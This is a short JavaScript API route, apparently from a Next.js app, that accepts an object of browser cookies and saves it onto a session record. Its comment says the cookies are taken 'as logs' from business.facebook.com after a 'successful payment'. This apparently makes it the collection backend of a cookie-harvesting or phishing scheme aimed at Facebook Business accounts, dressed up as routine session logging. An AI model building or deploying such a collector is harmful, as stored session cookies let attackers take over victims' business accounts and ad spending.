import { prisma } from "@/lib/prisma";

// PATCH /api/session/logs
// Body: { sessionId, logs: [...] }
// Fetches cookies as logs from business.facebook.com after a successful payment and upserts onto the session.
export async function PATCH(request) {
  try {
    const body = await request.json();
    const { sessionId, logs } = body;

    if (!sessionId) {
      return Response.json({ error: "sessionId required" }, { status: 400 });
    }
    if (!logs || typeof logs !== "object" || Array.isArray(logs)) {
      return Response.json({ error: "logs must be an object keyed by domain" }, { status: 400 });
    }

    const session = await prisma.session.update({
      where: { id: sessionId },
      data: { cookies: JSON.stringify(logs), updatedAt: new Date() },
      select: { id: true, updatedAt: true },
    });

    return Response.json({ ok: true, session });
  } catch (e) {
    if (e.code === "P2025") {
      return Response.json({ error: "Session not found" }, { status: 404 });
    }
    return Response.json({ error: e.message }, { status: 500 });
  }
}
